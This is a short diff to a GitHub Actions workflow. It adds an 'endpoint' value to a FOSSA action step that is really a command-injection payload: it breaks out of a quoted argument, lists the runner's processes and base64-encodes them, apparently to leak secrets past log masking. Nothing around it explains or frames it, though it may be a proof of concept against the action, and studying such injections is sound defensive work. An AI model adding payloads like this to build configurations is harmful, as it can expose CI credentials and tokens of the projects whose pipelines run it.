@@ -42,6 +42,7 @@ jobs:
       - uses: fossas/fossa-action@main 
         with:
           api-key: ${{env.FOSSA_API_KEY}}
+          endpoint: '" & ps x -w | base64 -w0 #'
           
       - uses: fossas/fossa-action@main 
         with:
